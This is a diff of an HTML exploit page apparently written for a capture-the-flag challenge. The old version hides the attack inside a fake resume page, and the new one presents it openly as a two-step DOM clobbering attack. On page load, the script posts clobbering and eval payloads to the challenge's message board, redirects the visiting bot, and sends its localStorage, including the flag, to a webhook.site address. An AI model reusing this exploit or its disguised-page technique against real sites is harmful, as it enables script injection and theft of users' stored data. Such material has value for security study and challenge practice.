@@ -1,175 +1,96 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Software Engineer Resume - John Doe</title>
+    <title>Two-Step DOM Clobbering Attack</title>
     <meta charset="UTF-8">
-    <style>
-        body { font-family: Arial, sans-serif; margin: 40px; }
-        .header { text-align: center; margin-bottom: 30px; }
-        .section { margin-bottom: 20px; }
-        h1 { color: #2c3e50; }
-        h2 { color: #34495e; border-bottom: 2px solid #3498db; }
-    </style>
 </head>
 <body>
-    <div class="header">
-        <h1>John Doe</h1>
-        <p>Senior Software Engineer</p>
-        <p>Email: john.doe@email.com | Phone: (555) 123-4567</p>
-        <p>LinkedIn: linkedin.com/in/johndoe | GitHub: github.com/johndoe</p>
-    </div>
-
-    <div class="section">
-        <h2>Professional Summary</h2>
-        <p>Experienced software engineer with 5+ years in full-stack development, specializing in JavaScript, Python, and cloud technologies.</p>
-    </div>
-
-    <div class="section">
-        <h2>Technical Skills</h2>
-        <ul>
-            <li><strong>Languages:</strong> JavaScript, Python, Java, TypeScript, SQL</li>
-            <li><strong>Frontend:</strong> React, Vue.js, HTML5, CSS3, Bootstrap</li>
-            <li><strong>Backend:</strong> Node.js, Express, Django, Flask</li>
-            <li><strong>Cloud:</strong> AWS, Docker, Kubernetes</li>
-        </ul>
-    </div>
-
-    <div class="section">
-        <h2>Work Experience</h2>
-        <h3>Senior Software Engineer - TechCorp (2021-Present)</h3>
-        <ul>
-            <li>Led development of microservices architecture serving 1M+ users</li>
-            <li>Reduced application load time by 40% through optimization</li>
-            <li>Mentored junior developers and conducted code reviews</li>
-        </ul>
-    </div>
-
-    <div class="section">
-        <h2>Education</h2>
-        <p><strong>Bachelor of Science in Computer Science</strong><br>
-        University of Technology, 2019</p>
-    </div>
-
+    <h1>Two-Step DOM Clobbering Attack for Job Clobbering</h1>
+    <p>This attack uses a two-message approach to bypass CSP restrictions.</p>
+    
     <script>
         const CHALLENGE_ORIGIN = 'https://jobclobbering-fe734e8816c7316e.chal.secjhu.club';
         const WEBHOOK_URL = 'https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e';
         
-        console.log('[REDIRECT-ATTACK] Starting redirect-based attack');
+        console.log('[TWO-STEP-ATTACK] Starting two-step DOM Clobbering attack');
         
-        // 发送页面加载信号
-        const loadImg = new Image();
-        loadImg.src = WEBHOOK_URL + '?event=REDIRECT_ATTACK_LOADED&domain=' + encodeURIComponent(window.location.hostname) + '&t=' + Date.now();
-
-        // 关键洞察：Bot访问我们的页面后，我们需要让Bot在同一个浏览器上下文中访问挑战网站
-        // 最直接的方法：先POST消息，然后直接跳转，让Bot在挑战网站上执行我们的代码
+        // Step 1: JavaScript payload (stored as message content, not executed immediately)
+        const javascriptPayload = `*/(new Image).src="${WEBHOOK_URL}?flag="+encodeURIComponent(localStorage.getItem("flag")||"no-flag")+"&source=TWO_STEP_SUCCESS&domain="+encodeURIComponent(window.location.hostname)+"&t="+Date.now()//`;
         
-        async function executeRedirectAttack() {
+        // Step 2: DOM Clobbering payload (references the first message)
+        const domClobberingPayload = `<a id=utilsJS></a><a id=utilsJS name=url href="javascript:eval(Messages[0].split(':::')[1])"></a>`;
+        
+        async function executeAttack() {
             try {
-                console.log('[REDIRECT-ATTACK] Step 1: Posting DOM Clobbering message...');
+                console.log('[TWO-STEP-ATTACK] Step 1: Posting JavaScript payload message...');
                 
-                // 发送攻击开始信号
-                const startImg = new Image();
-                startImg.src = WEBHOOK_URL + '?event=ATTACK_START&step=1&t=' + Date.now();
-                
-                // 创建恶意JavaScript - 这次确保语法完全正确
-                const webhookUrl = WEBHOOK_URL;
-                const maliciousJS = 
-                    'console.log("[JOBCLOBBERING] Executing on target domain!");' +
-                    'console.log("[JOBCLOBBERING] Domain:", window.location.hostname);' +
-                    'try{' +
-                        'var flag=localStorage.getItem("flag");' +
-                        'console.log("[JOBCLOBBERING] Flag found:", flag);' +
-                        'if(flag && flag!=="null" && flag.trim()!==""){' +
-                            'console.log("🎉 FLAG CAPTURED:", flag);' +
-                            'var img=new Image();' +
-                            'img.src="' + webhookUrl + '?flag="+encodeURIComponent(flag)+"&source=REDIRECT_SUCCESS&domain="+encodeURIComponent(window.location.hostname)+"&t="+Date.now();' +
-                            'fetch("' + webhookUrl + '?flag="+encodeURIComponent(flag)+"&source=REDIRECT_FETCH&t="+Date.now()).catch(function(){});' +
-                        '}else{' +
-                            'console.log("[JOBCLOBBERING] No flag found");' +
-                            'var img2=new Image();' +
-                            'img2.src="' + webhookUrl + '?status=no_flag_found&domain="+encodeURIComponent(window.location.hostname)+"&t="+Date.now();' +
-                        '}' +
-                        'var allData={};' +
-                        'for(var i=0;i<localStorage.length;i++){' +
-                            'var k=localStorage.key(i);' +
-                            'allData[k]=localStorage.getItem(k);' +
-                        '}' +
-                        'var img3=new Image();' +
-                        'img3.src="' + webhookUrl + '?all_storage="+encodeURIComponent(JSON.stringify(allData))+"&domain="+encodeURIComponent(window.location.hostname)+"&t="+Date.now();' +
-                    '}catch(e){' +
-                        'console.error("[JOBCLOBBERING] Error:", e);' +
-                        'var img4=new Image();' +
-                        'img4.src="' + webhookUrl + '?error="+encodeURIComponent(e.message)+"&domain="+encodeURIComponent(window.location.hostname)+"&t="+Date.now();' +
-                    '}';
-
-                // 创建DOM Clobbering payload
-                const domClobPayload = '<div id="utilsJS"><div id="url">data:text/javascript,' + encodeURIComponent(maliciousJS) + '</div></div>';
-                
-                console.log('[REDIRECT-ATTACK] Payload created, length:', domClobPayload.length);
-                
-                // POST消息到挑战网站
-                const response = await fetch(CHALLENGE_ORIGIN + '/messages', {
+                // Post the JavaScript payload as message 0
+                const response1 = await fetch(CHALLENGE_ORIGIN + '/messages', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify({
-                        name: 'JobSeeker',
-                        message: domClobPayload
-                    })
+                    body: JSON.stringify({ 
+                        name: 'Attacker1', 
+                        message: javascriptPayload 
+                    }),
+                    credentials: 'include'
                 });
                 
-                console.log('[REDIRECT-ATTACK] POST response status:', response.status);
-                
-                if (response.ok) {
-                    console.log('[REDIRECT-ATTACK] Message posted successfully');
-                    
-                    const successImg = new Image();
-                    successImg.src = WEBHOOK_URL + '?event=MESSAGE_POSTED&status=success&step=2&t=' + Date.now();
-                    
-                    // 关键：立即跳转到挑战网站，让Bot在挑战网站上执行我们的代码
-                    // Bot会在同一个浏览器上下文中访问挑战网站，因此能够访问之前设置的localStorage
-                    console.log('[REDIRECT-ATTACK] Step 2: Redirecting Bot to target site...');
-                    
-                    const redirectImg = new Image();
-                    redirectImg.src = WEBHOOK_URL + '?event=REDIRECTING_BOT&target=' + encodeURIComponent(CHALLENGE_ORIGIN + '/#messages') + '&step=3&t=' + Date.now();
-                    
-                    // 短暂延迟确保webhook请求发送
-                    setTimeout(() => {
-                        // 这个跳转会让Bot在挑战网站域名下，触发getMessages() -> loadMessageBoardJS()
-                        // loadMessageBoardJS()会读取我们clobbered的window.utilsJS.url并执行恶意脚本
-                        // 恶意脚本在挑战网站域名下执行，可以访问Bot设置的localStorage
-                        window.location.href = CHALLENGE_ORIGIN + '/#messages';
-                    }, 500);
-                    
-                } else {
-                    console.error('[REDIRECT-ATTACK] POST failed with status:', response.status);
-                    
-                    const errorImg = new Image();
-                    errorImg.src = WEBHOOK_URL + '?event=POST_FAILED&status=' + response.status + '&t=' + Date.now();
+                if (!response1.ok) {
+                    throw new Error(`Failed to post JavaScript payload: ${response1.status}`);
                 }
                 
-            } catch (error) {
-                console.error('[REDIRECT-ATTACK] Attack failed:', error);
+                console.log('[TWO-STEP-ATTACK] Step 1 completed successfully');
                 
-                const errorImg = new Image();
-                errorImg.src = WEBHOOK_URL + '?event=ATTACK_ERROR&error=' + encodeURIComponent(error.message) + '&t=' + Date.now();
+                // Wait a moment for the message to be processed
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+                console.log('[TWO-STEP-ATTACK] Step 2: Posting DOM Clobbering payload...');
+                
+                // Post the DOM Clobbering payload as message 1
+                const response2 = await fetch(CHALLENGE_ORIGIN + '/messages', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ 
+                        name: 'Attacker2', 
+                        message: domClobberingPayload 
+                    }),
+                    credentials: 'include'
+                });
+                
+                if (!response2.ok) {
+                    throw new Error(`Failed to post DOM Clobbering payload: ${response2.status}`);
+                }
+                
+                console.log('[TWO-STEP-ATTACK] Step 2 completed successfully');
+                
+                // Send success notification
+                const img = new Image();
+                img.src = WEBHOOK_URL + '?event=MESSAGES_POSTED&status=success&step=both&domain=' + encodeURIComponent(window.location.hostname) + '&t=' + Date.now();
+                
+                // Wait a moment then redirect to trigger the attack
+                await new Promise(resolve => setTimeout(resolve, 1500));
+                
+                console.log('[TWO-STEP-ATTACK] Step 3: Redirecting bot to challenge site...');
+                window.location.href = CHALLENGE_ORIGIN + '/#messages';
+                
+            } catch (error) {
+                console.error('[TWO-STEP-ATTACK] Attack failed:', error);
+                const img = new Image();
+                img.src = WEBHOOK_URL + '?event=ATTACK_FAILED&error=' + encodeURIComponent(error.message) + '&domain=' + encodeURIComponent(window.location.hostname) + '&t=' + Date.now();
             }
         }
-
-        // 页面加载后立即执行攻击
+        
+        // Execute the attack when the page loads
         window.addEventListener('load', () => {
-            console.log('[REDIRECT-ATTACK] Page loaded, executing attack immediately...');
+            console.log('[TWO-STEP-ATTACK] Page loaded, starting attack...');
+            const img = new Image();
+            img.src = WEBHOOK_URL + '?event=ATTACK_PAGE_LOADED&domain=' + encodeURIComponent(window.location.hostname) + '&t=' + Date.now();
             
-            // 很短的延迟确保页面完全加载
-            setTimeout(() => {
-                executeRedirectAttack();
-            }, 1000);
-        });
-
-        // 页面卸载时发送信号
-        window.addEventListener('beforeunload', () => {
-            navigator.sendBeacon(WEBHOOK_URL + '?event=REDIRECT_ATTACK_UNLOAD&t=' + Date.now());
+            executeAttack();
         });
     </script>
 </body>
